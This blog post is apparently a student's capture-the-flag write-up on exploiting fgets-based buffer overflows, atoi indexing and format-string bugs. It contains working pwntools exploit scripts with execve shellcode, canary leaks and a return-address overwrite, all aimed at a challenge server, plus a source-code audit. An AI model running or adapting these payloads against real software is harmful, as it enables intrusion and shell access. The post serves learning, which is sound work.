---
title: So You Think Fgets is Safe?
date: "2020-07-12 15:10:31.582772"
description: "Exploiting the use of improper fgets to grab a shell :)"
categories: ["code"]
---

## Shellcrack

---

FLAG{REDACTED}

---

This was a simple, "run your shellcode" challenge. Use the buffer overflow to overwrite the return address with the address of your buffer. Since the address of the buffer is given to you, this one was pretty easy.

If there was one issue, it would be that there's a canary. But since it does not show up on `checksec`, it is a user made canary. The fun part is that the canary leaks itself, because the buffer is copied to 0x20 bytes after the start of the actual buffer, and printed from there, leaking the canary which is right after. Brilliant.

1. Since the fread, accepts only 0x10 bytes, we put in some random characters + a newline
2. Read in the canary that was leaked
3. Put the shellcode in the buffer, then proceed to jump to it and execute to pop a shell
4. `cat flag`

```
#!/usr/bin/python3

from pwn import *

#p = process('./shellcrack')
p = remote('plsdonthaq.me', 5001)

fread = b'\x90' * (0x10 - 1)

# shell exec code lol
payload = asm('''

sub esp, 0x50

push 0
push {}
push {}

mov eax, 0xb
mov ebx, esp
mov ecx, 0
mov edx, 0
mov esi, 0

int 0x80

'''.format(u32('//sh'), u32('/bin')))

padding = b'AAAABBBBC'

p.readline()
p.sendline(fread)
p.readline()

canary = p.readn(8)

retPad = b'A' * 16

p.readuntil('[')
buffer = int(p.readuntil(']', drop=True), 16)
ret = p32(buffer)
p.sendline(payload + padding + canary + retPad + ret)


p.interactive()
```

## Stack-dump2

---

FLAG{REDACTED}

---

_stack-dump + aslr? ez_

Thought this one would be harder. Building on the stack-dump from week 2, this time all I had to do extra was leak some addresses.

Although fgets is used, we specify the length, rendering it completely useless.

1. Grab the pointer on the stack, it's just one byte from the start of the buffer, so that's great.
2. Dump the canary by reading memory from the start of the canary, which is `0x69` bytes from the useful pointer.
3. On reading the canary, the next step is finding where the `win` function is. We do that by leaking another address on the stack, this time from the code section. (Just in case the offsets for the code part and the stack are different)
4. Use the code pointer to find the address of the `win` function
5. Find the padding before and after the canary and overflow, to jump to the win function.
6. `cat flag`

```
#!/usr/bin/python3

from pwn import *

#p = process('./stack-dump2')
p = remote('plsdonthaq.me', 5002)

p.readuntil('useful stack pointer ')
stackPointer = int(p.readuntil('\n', drop=True), 16)


p.sendline('a')
p.readuntil(': ')
p.sendline('5')
p.sendline(p32(stackPointer + 0x69))
p.sendline('b')


p.readuntil(': ')
canary = p.readn(4)

p.readuntil('quit')
p.sendline('a')

p.readuntil(': ')
p.sendline('5')
p.sendline(p32(stackPointer + 0x3d))
p.sendline('b')

p.readuntil(': ')
codePointer = u32(p.readn(4))

win = codePointer - 0x183b

canaryPadding = b'A' * 0x60
returnPadding = b'A' * 8

p.readuntil('quit')
p.sendline('a')
p.readuntil(': ')
p.sendline('113')           # 0x60 + 4 + 8 + 4 + 1 (newline)
p.sendline(canaryPadding + canary + returnPadding + p32(win))

p.readuntil('quit')
p.readuntil('quit')

p.sendline('d')

p.interactive()
```

## Image-viewer

---

FLAG{REDACTED}

---

_The effect of an unchecked atoi can be so intense lol_

This was a very interesting exploit. Since the buffer and the images array both are global variables, and the atoi is directly used to index into the array, it can be used to index into the buffer, using negative indices. Pretty cool. All you need to be careful is of byte alignment.

1. First you need the index. I chose -2, but -1 would also work the same. Put this index at the start of the buffer, so you can pass that to atoi.
2. Choose your filename. The whole idea is that you can read any file you want, so choose the name, and put it right after the index (although it can be _mostly_ anywhere in the buffer). Remember that the "blacklist" was for the exact file name, so it is easy to get around by simply supplying a relative path like `./flag` instead of `flag`.
3. Find the address of the filename string. In my case, it was `0x804c064`, although there was no need to worry about byte alignment for the filename.
4. Padding the buffer with a bunch of 'a's, the next thing on the list is memory management.
5. Make sure that the "entry" into the images array seems legitimate, we use the first 4 bytes to store the id, which based on the checks should be the same as the array index, -2 in this case. The next 4 bytes store the address to the filename. You need to worry about byte alignment for the index to be correct, so "allocating memory" for the images array from the end of the buffer is a great idea.
6. You can now leak any file you want :)

```
#!/usr/bin/python3

from pwn import *

#p = process('./image-viewer')
p = remote('plsdonthaq.me', 5003)

p.readuntil('pls')
p.sendline('trivial')

# checking byte alignment
p.readuntil('truth')
#filename = b'./flat earth truth\x00'
filename = b'./flag\x00'
p.sendline(b'-2' + b'AA' + filename + b'A' * (108 - len(filename)) + p32(0xfffffffe) + p32(0x804c064))

p.interactive()
```

## Reversing: Chall.jpg

---

_The magic numbers really threw me off_

My only thought when this compiled to something very close to the image was, "_Why is it that simple!?_ "
So I looked into it a bit more. I believe here's what the mod operation does (atleast in C)

1. Use the "magic number", in this case `0x2aaaaaab`, integer multiply with the sum of the two arguments.
2. Then get the top bit of the number. If the number is negative (top bit is 1), it would then subtract it from the product calculated in 1.
3. Now I call it the "magic number", because somehow at this point it has the calculated the largest number that when multiplied by 6 (the number that the sum is modded by) gives the largest number less than the sum. For example, if `(arg1 + arg2) == 13` then the calculated number is `2`. And `2 * 6 == 12` is the largest multiple of `6` less than `13`
4. The triple `add` instructions are simply multiplying the number calculated in (3) by `6`.
5. Then it subtracts the largest multiple from the sum and returns the remainder.
6. I also checked out odd number mods and that shifts the number to the right by `1` before shifting it back by `2`. hmmmmm
7. It also becomes very different when I optimize using the `-O2` flag.

```
int re_this(int arg1, int arg2) {
    return (arg1 + arg2) % 6;
}

```

## Source Code Auditing: source.c

---

There were ~~three~~ two and a half (??) vulnerabilites that were found in the source code.

The first one was a format string vulnerability on lines 142-146. Although `snprintf` is used, and a constant length is given to the function, the format is left to the user. Brilliant.

1.  This lets me dump the whole stack if I want into the syslog (which can be used through the next vulnerability) or write to anywhere in the program, (perhaps the GOT?) letting me gain some RCE :)

```
char log[MAX_LEN];
snprintf(log, MAX_LEN,
            "SERVER: %d admin level, attempting command %x, args %s\n",
            admin_level, action[0], action + 1);
syslog(LOG_INFO, log);
```

The next one was an overlook? but the `admin_level` is set to a default of `0` which means any user that connects to the server is automatically admin. GG.

1. That essentially lets me run any commands on the server. If I can run another vulnerable program, maybe I can do a privilege escalation to get root privileges yay!
2. I could also use the vuln (1) to then send the dumped data from syslog over to my server for further exploitation of the server. (but I wouldn't need to)

The issue was on line 140:

```
uint8_t admin_level = 0;
```

**_When the program is so broken that even the exploit doesn't work_**.  
This third one I thought was a vulnerability, but it is more a vulnerability in the making. The switch statement in the `SET_PERMISSION_LEVEL` sets the `admin_level`, which is an unsigned 8-bit integer to the value of `level`, which is a 32-bit integer.

1. That would allow the user to easily overflow the value of `admin_level` to zero by setting `level` to a multiple of `256`.
2. However, this **does not work in practice** as the `sscanf` will never succeed in reading anything, because the first character of `action` array is never discarded by the program, nor does it allow the user to enter more characters. So if the user entered `U` to execute the `SET_PERMISSION_LEVEL` case, it wouldn't be able to read in `U` into level, and it would set the `admin_level` to `-1`.
3. There is also no break statement after the `SET_PERMISSION_LEVEL` case, so if the command runner (`T`) was ever a blocked command, you could run it using (`U`) which should only set permissions, but not really.
4. **So while this is not a vulnerability right now, it will be one when the developer gets the `SET_PERMISSION_LEVEL` case to work as intended. Which is something to look out for**

The broken code in question:

```
uint8_t admin_level = 0;
.
. <other code>
.
case SET_PERMISSION_LEVEL: {
    int level = -1;
    sscanf(action, "%d", &level);
    // Don't allow people to set themselves to admin.
    if (level == 0) {
    continue;
    }

    admin_level = level;
}
```

## Conclusion

---

This was an interesting week, because while the challenges were easier than last week in general, with the exception of `shellcrack` all the programs used `fgets` to run a buffer overflow instead of `gets`. It is important to make sure I don't discard `fgets` as a point of attack in the future just because it is `fgets` and a length is passed in so there is no way that I can exploit it.  
Nonetheless, was fun exploiting.
